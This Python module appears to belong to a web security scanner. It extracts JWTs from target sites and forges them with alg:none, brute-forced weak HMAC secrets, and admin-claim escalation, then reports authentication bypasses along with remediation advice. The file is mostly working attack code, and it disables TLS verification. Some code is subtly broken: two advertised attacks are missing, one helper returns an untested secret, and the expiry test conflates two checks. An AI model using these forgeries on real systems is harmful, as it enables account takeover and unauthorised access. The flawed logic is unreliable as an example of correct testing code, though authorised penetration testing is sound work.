"""
JWT (JSON Web Token) Attack Module
Tests for common JWT vulnerabilities including alg:none, weak secrets, and key confusion
"""

import asyncio
import base64
import json
import hmac
import hashlib
import re
from typing import List, Optional, Dict, Tuple
from dataclasses import dataclass

import httpx

from core.rate_limiter import RateLimiter
from utils.logger import setup_logger


@dataclass
class JWTFinding:
    """Represents a JWT vulnerability finding"""
    url: str
    attack_type: str    # 'alg_none', 'weak_secret', 'key_confusion', 'expired_accepted', 'info_disclosure'
    severity: str
    confidence: str
    original_token: str
    forged_token: str
    evidence: str
    remediation: str


class JWTAttackScanner:
    """
    JWT Attack Module
    Tests for:
    - Algorithm confusion (alg:none)
    - Weak HMAC secrets (brute-force)
    - RS256 -> HS256 key confusion
    - Expired token accepted
    - Sensitive data in JWT payload (info disclosure)
    - JWT header injection
    - kid (Key ID) injection
    """

    def __init__(self, rate_limiter: RateLimiter):
        self.rate_limiter = rate_limiter
        self.logger = setup_logger("JWTAttack")
        self.findings: List[JWTFinding] = []
        self.client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(15.0, connect=10.0)

        # Common weak JWT secrets to brute-force
        self.weak_secrets = [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "jwt-secret", "jwtsecret",
            "your-256-bit-secret", "your-secret-key",
            "supersecret", "mysecret", "changeme",
            "default", "test", "development", "dev",
            "production", "staging", "letmein",
            "qwerty", "abc123", "password123",
            "secretkey", "secret_key", "app_secret",
            "flask-secret", "django-secret", "laravel-secret",
            "rails-secret", "express-secret",
            "", "null", "undefined", "none",
        ]

    # ─── JWT Utility Methods ──────────────────────────────────────────────────

    def _b64_decode(self, data: str) -> bytes:
        """Base64url decode with padding fix"""
        data += '=' * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(data)

    def _b64_encode(self, data: bytes) -> str:
        """Base64url encode without padding"""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def _parse_jwt(self, token: str) -> Optional[Tuple[Dict, Dict, str]]:
        """Parse JWT into (header, payload, signature)"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            header  = json.loads(self._b64_decode(parts[0]))
            payload = json.loads(self._b64_decode(parts[1]))
            return header, payload, parts[2]
        except Exception:
            return None

    def _build_jwt(self, header: Dict, payload: Dict, secret: str = "",
                   algorithm: str = "HS256") -> str:
        """Build a signed or unsigned JWT"""
        h = self._b64_encode(json.dumps(header,  separators=(',', ':')).encode())
        p = self._b64_encode(json.dumps(payload, separators=(',', ':')).encode())
        signing_input = f"{h}.{p}"

        if algorithm == "none" or not secret:
            return f"{signing_input}."

        if algorithm == "HS256":
            sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
        elif algorithm == "HS384":
            sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha384).digest()
        elif algorithm == "HS512":
            sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha512).digest()
        else:
            return f"{signing_input}."

        return f"{signing_input}.{self._b64_encode(sig)}"

    def _check_sensitive_data(self, payload: Dict) -> List[str]:
        """Check JWT payload for sensitive data"""
        sensitive = []
        sensitive_keys = [
            'password', 'passwd', 'pwd', 'secret', 'key', 'api_key',
            'token', 'credit_card', 'cc', 'ssn', 'private',
            'internal', 'hash', 'salt', 'pepper'
        ]
        for key, value in payload.items():
            if any(sk in key.lower() for sk in sensitive_keys):
                sensitive.append(f"{key}: {str(value)[:30]}")
        return sensitive

    def _extract_tokens_from_response(self, response: httpx.Response) -> List[str]:
        """Extract JWT tokens from response headers and body"""
        tokens = []
        jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
        )

        # From headers
        for header_val in response.headers.values():
            tokens.extend(jwt_pattern.findall(header_val))

        # From body
        tokens.extend(jwt_pattern.findall(response.text))

        # From cookies
        for cookie_val in response.cookies.values():
            tokens.extend(jwt_pattern.findall(cookie_val))

        return list(set(tokens))

    # ─── Attack Methods ───────────────────────────────────────────────────────

    def _forge_alg_none(self, header: Dict, payload: Dict) -> List[str]:
        """Generate alg:none forged tokens"""
        forged = []
        for alg_none_val in ["none", "None", "NONE", "nOnE"]:
            h = header.copy()
            h['alg'] = alg_none_val
            forged.append(self._build_jwt(h, payload, algorithm="none"))
        return forged

    def _forge_weak_secret(self, header: Dict, payload: Dict) -> Optional[Tuple[str, str]]:
        """Try to forge token with weak secret"""
        alg = header.get('alg', 'HS256')
        if not alg.startswith('HS'):
            return None

        for secret in self.weak_secrets:
            token = self._build_jwt(header, payload, secret=secret, algorithm=alg)
            return token, secret  # Return first match attempt (server will confirm)
        return None

    def _forge_expired_removed(self, header: Dict, payload: Dict) -> str:
        """Remove exp claim to test if expiry is validated"""
        p = payload.copy()
        p.pop('exp', None)
        p.pop('nbf', None)
        return self._build_jwt(header, p, algorithm="none")

    def _forge_admin_escalation(self, header: Dict, payload: Dict) -> Optional[str]:
        """Try privilege escalation by modifying role/admin claims"""
        p = payload.copy()
        changed = False

        # Role escalation
        for key in ['role', 'roles', 'group', 'groups', 'type', 'user_type']:
            if key in p:
                p[key] = 'admin'
                changed = True

        # Admin flag
        for key in ['is_admin', 'admin', 'isAdmin', 'is_superuser', 'superuser']:
            if key in p:
                p[key] = True
                changed = True

        if not changed:
            return None

        h = header.copy()
        h['alg'] = 'none'
        return self._build_jwt(h, p, algorithm="none")

    # ─── HTTP Testing ─────────────────────────────────────────────────────────

    async def _send_with_token(self, url: str, token: str,
                                original_response_size: int) -> Optional[httpx.Response]:
        """Send request with JWT in Authorization header"""
        try:
            async def _do_request():
                return await self.client.get(
                    url,
                    headers={
                        'Authorization': f'Bearer {token}',
                        'Cookie': f'token={token}; jwt={token}; access_token={token}',
                    },
                    follow_redirects=True
                )
            return await self.rate_limiter.execute_with_retry(_do_request)
        except Exception as e:
            self.logger.debug(f"JWT request failed: {e}")
            return None

    def _is_auth_bypass(self, original: httpx.Response,
                         forged: httpx.Response) -> Tuple[bool, str]:
        """
        Determine if forged token caused auth bypass.
        Returns (is_bypass, evidence)
        """
        orig_status  = original.status_code
        forged_status = forged.status_code

        # Was originally unauthorized, now authorized
        if orig_status in [401, 403] and forged_status == 200:
            return True, (
                f"Auth bypass! Original: {orig_status}, Forged: {forged_status}. "
                f"Response size: {len(forged.text)}B"
            )

        # Both 200 but content changed significantly
        if orig_status == 200 and forged_status == 200:
            size_diff = abs(len(original.text) - len(forged.text))
            if size_diff > 200:
                # Check for admin/privilege indicators
                forged_lower = forged.text.lower()
                if any(kw in forged_lower for kw in [
                    'admin', 'dashboard', 'welcome', 'logout',
                    'profile', 'settings', 'manage'
                ]):
                    return True, (
                        "Response changed after JWT forgery. "
                        f"Size diff: {size_diff}B. Admin content may be accessible."
                    )

        return False, ""

    async def test_url(self, url: str, token: str) -> List[JWTFinding]:
        """Test a URL with JWT attacks"""
        findings = []
        parsed = self._parse_jwt(token)
        if not parsed:
            return []

        header, payload, _ = parsed

        # ── 1. Info Disclosure ────────────────────────────────────────────────
        sensitive = self._check_sensitive_data(payload)
        if sensitive:
            findings.append(JWTFinding(
                url=url,
                attack_type="info_disclosure",
                severity="high",
                confidence="high",
                original_token=token[:50] + "...",
                forged_token="N/A",
                evidence=f"Sensitive data in JWT payload: {', '.join(sensitive)}",
                remediation=(
                    "1. Never store sensitive data in JWT payload — it is base64 encoded, NOT encrypted.\n"
                    "2. Store only non-sensitive identifiers (user ID, role).\n"
                    "3. Use JWE (JSON Web Encryption) if sensitive data must be in token."
                )
            ))

        # ── 2. alg:none Attack ────────────────────────────────────────────────
        original_response = await self._send_with_token(url, token, 0)
        if not original_response:
            return findings

        for forged_token in self._forge_alg_none(header, payload):
            forged_response = await self._send_with_token(url, forged_token, len(original_response.text))
            if not forged_response:
                continue

            is_bypass, evidence = self._is_auth_bypass(original_response, forged_response)
            if is_bypass:
                findings.append(JWTFinding(
                    url=url,
                    attack_type="alg_none",
                    severity="critical",
                    confidence="high",
                    original_token=token[:50] + "...",
                    forged_token=forged_token[:80] + "...",
                    evidence=f"alg:none accepted! {evidence}",
                    remediation=(
                        "1. Explicitly reject tokens with alg:none on server side.\n"
                        "2. Whitelist allowed algorithms — never trust the header's alg claim.\n"
                        "3. Use a well-maintained JWT library with secure defaults.\n"
                        "4. Python: use PyJWT with algorithms=['HS256'] parameter."
                    )
                ))
                break

        # ── 3. Weak Secret ────────────────────────────────────────────────────
        alg = header.get('alg', '')
        if alg.startswith('HS'):
            for secret in self.weak_secrets:
                forged_token = self._build_jwt(header, payload, secret=secret, algorithm=alg)
                forged_response = await self._send_with_token(url, forged_token, len(original_response.text))
                if not forged_response:
                    continue

                is_bypass, evidence = self._is_auth_bypass(original_response, forged_response)
                if is_bypass:
                    findings.append(JWTFinding(
                        url=url,
                        attack_type="weak_secret",
                        severity="critical",
                        confidence="high",
                        original_token=token[:50] + "...",
                        forged_token=forged_token[:80] + "...",
                        evidence=f"Weak JWT secret '{secret}' accepted! {evidence}",
                        remediation=(
                            "1. Use a cryptographically random secret of at least 256 bits.\n"
                            "2. Generate with: python -c \"import secrets; print(secrets.token_hex(32))\"\n"
                            "3. Store secret in environment variable, never in code.\n"
                            "4. Rotate JWT secret immediately and invalidate all existing tokens."
                        )
                    ))
                    break

        # ── 4. Privilege Escalation ───────────────────────────────────────────
        escalated_token = self._forge_admin_escalation(header, payload)
        if escalated_token:
            forged_response = await self._send_with_token(url, escalated_token, len(original_response.text))
            if forged_response:
                is_bypass, evidence = self._is_auth_bypass(original_response, forged_response)
                if is_bypass:
                    findings.append(JWTFinding(
                        url=url,
                        attack_type="privilege_escalation",
                        severity="critical",
                        confidence="high",
                        original_token=token[:50] + "...",
                        forged_token=escalated_token[:80] + "...",
                        evidence=f"Privilege escalation via JWT claim manipulation! {evidence}",
                        remediation=(
                            "1. Never trust JWT claims without server-side signature verification.\n"
                            "2. Fetch user roles from database, not from JWT payload.\n"
                            "3. Use alg:RS256 or ES256 with proper key management."
                        )
                    ))

        # ── 5. Expired Token Accepted ─────────────────────────────────────────
        expired_token = self._forge_expired_removed(header, payload)
        forged_response = await self._send_with_token(url, expired_token, len(original_response.text))
        if forged_response and forged_response.status_code == 200:
            findings.append(JWTFinding(
                url=url,
                attack_type="expired_accepted",
                severity="medium",
                confidence="medium",
                original_token=token[:50] + "...",
                forged_token=expired_token[:80] + "...",
                evidence="Token without exp claim accepted — expiry may not be validated",
                remediation=(
                    "1. Always validate the exp (expiration) claim server-side.\n"
                    "2. Set reasonable token expiry (15-60 minutes for access tokens).\n"
                    "3. Implement token revocation/blacklist for logout."
                )
            ))

        return findings

    async def scan(self, target_urls: List[str], forms: List = None) -> List[JWTFinding]:  # NEW-BUG-001 FIX
        forms = forms or []  # NEW-BUG-001 FIX
        """Main JWT attack scan — finds tokens and tests them"""
        self.logger.info(f"Starting JWT attack scan on {len(target_urls)} URLs")

        headers = {
            'User-Agent': '0xHunter Security Scanner (Authorized Testing)',
            'Accept': 'application/json, text/html, */*',
        }

        async with httpx.AsyncClient(
            headers=headers,
            timeout=self.timeout,
            follow_redirects=True,
            verify=False
        ) as client:
            self.client = client
            tokens_found: Dict[str, List[str]] = {}

            # Step 1: Crawl URLs and extract JWT tokens
            for url in target_urls:
                try:
                    async def _do_get(u=url):
                        return await client.get(u, follow_redirects=True)
                    response = await self.rate_limiter.execute_with_retry(_do_get)
                    if response:
                        tokens = self._extract_tokens_from_response(response)
                        if tokens:
                            tokens_found[url] = tokens
                            self.logger.info(f"Found {len(tokens)} JWT token(s) at {url}")
                except Exception as e:
                    self.logger.debug(f"Token extraction failed {url}: {e}")

            # Step 2: Attack each found token
            tasks = []
            for url, tokens in tokens_found.items():
                for token in tokens:
                    tasks.append(self.test_url(url, token))

            if not tasks:
                self.logger.info("No JWT tokens found in responses")
                return []

            self.logger.info(f"Testing {len(tasks)} JWT token(s)...")
            results = await asyncio.gather(*tasks, return_exceptions=True)

            seen = set()
            for result in results:
                if isinstance(result, Exception):
                    self.logger.debug(f"JWT test error: {result}")
                    continue
                if isinstance(result, list):
                    for finding in result:
                        key = f"{finding.url}:{finding.attack_type}"
                        if key not in seen:
                            seen.add(key)
                            self.findings.append(finding)
                            self.logger.warning(
                                f"JWT [{finding.severity.upper()}]: {finding.url} | "
                                f"Attack: {finding.attack_type}"
                            )

        self.logger.info(f"JWT scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings
